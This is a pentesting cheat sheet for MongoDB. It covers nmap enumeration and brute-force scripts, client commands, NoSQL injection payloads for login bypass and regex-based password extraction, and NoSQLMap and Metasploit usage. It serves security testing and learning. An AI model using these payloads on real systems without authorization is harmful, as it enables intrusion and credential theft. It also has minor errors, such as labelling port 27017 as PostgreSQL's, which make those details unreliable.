# MongoDB  

PostgreSQL default port: `27017/tcp`

- [MongoDB](#mongodb)
  - [Nmap](#nmap)
  - [Client](#client)
    - [Databases](#databases)
    - [Collection](#collection)
      - [Search in collection](#search-in-collection)
  - [Injection NoSQL](#injection-nosql)
    - [Basic login bypass](#basic-login-bypass)
    - [Get request](#get-request)
    - [Post request](#post-request)
    - [JSON](#json)
  - [Tools](#tools)
    - [NoSQLMap](#nosqlmap)
    - [Metasploit MongoDB modules](#metasploit-mongodb-modules)
  - [Source](#source)

## Nmap

```bash
nmap -sV -sC TARGET_IP -p 27017 --script mongodb-databases,mongodb-info,mongodb-brute
```

## Client

Local host 

    mongo

Remote host 
```zsh
mongo TARGET_IP
mongo TARGET_IP:PORT_NB/DATABASE_NAME
mongo TARGET_IP:PORT_NB DATABASE_NAME -u 'USERNAME' -p 'PASSWORD'
```

### Databases

View databases

```sql
SHOW databases
```
SELECT database

```sql
USE [DATABASE_NAME]
```

Drop database

```sql
db.dropDatabase()
```

### Collection

```sql
show collections
db.createCollection("COLLECTION_NAME")
db.getCollectionNames();
```


```sql
db.COLLECTION_NAME.find()
db.COLLECTION_NAME.insert({id:"1", username: "admin", password: "adminpass"})
db.COLLECTION_NAME.update({id:"2"}, {$set: {username: "bob"}});
db.COLLECTION_NAME.remove({'id':'2'})
db.COLLECTION_NAME.drop()
```


#### Search in collection

```sql
db.COLLECTION_NAME.findOne({username: "admin")
db.COLLECTION_NAME.findOne({username: "admin", password: {"$ne":"xyz"}})
```


|Operators|Description|
|:--------|:----------|
|$eq|matches records that equal to a certain value|
|$ne|matches records that are not equal to a certain value|
|$gt|matches records that are greater than a certain value.|
|$where|matches records based on Javascript condition|
|$exists|matches records that have a certain field|
|$regex|matches records that satisfy certain regular expressions.|

## Injection NoSQL

### Basic login bypass

```sql
' || 1==1//
' || 1==1%00
```


### Get request

    http://TARGET_IP/search?username=ben&role=user
    http://TARGET_IP/search?username[$ne]=ben&role=user

### Post request 

login bypass

```sql
username=admin&password[$ne]=NoThePassword
username[$eq]=admin&password[$ne]=NoThePassword
username[$eq]=admin&password[$regex]=.*
```

Extract length information

```sql
username[$eq]=admin&password[$regex]=.{1}
username[$eq]=admin&password[$regex]=^.{3}$
username[$eq]=admin&password[$regex]=^.{3,6}$
```

```sql
username[$eq]=admin&password[$lt]=s
username[$eq]=admin&password[$gt]=s
```

```sql
username=admin&password[$regex]=m.*
username=admin&password[$regex]=md.*
```

### JSON

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$e": "admin"}, "password": {"$ne": "NoThePassword"}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## Tools

### NoSQLMap

Source:

    https://github.com/codingo/NoSQLMap.git

Command:

```zsh
nosqlmap.py --victim 'http://IP_ADDRESS' --attack 2 --webPort PORT_NB --uri /index.php --httpMethod POST --postData ARG_1,ARG_2,ARG_3
```

### Metasploit MongoDB modules

    auxiliary/scanner/mongodb/mongodb_login
    auxiliary/gather/mongodb_js_inject_collection_enum
    exploit/linux/misc/mongod_native_helper

## Source

- https://medium.com/rangeforce/nosqlmap-a67d76b88c48
- https://book.hacktricks.xyz/pentesting-web/nosql-injection
- https://www.rapid7.com/blog/post/2016/07/28/pentesting-in-the-real-world-going-bananas-with-mongodb/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
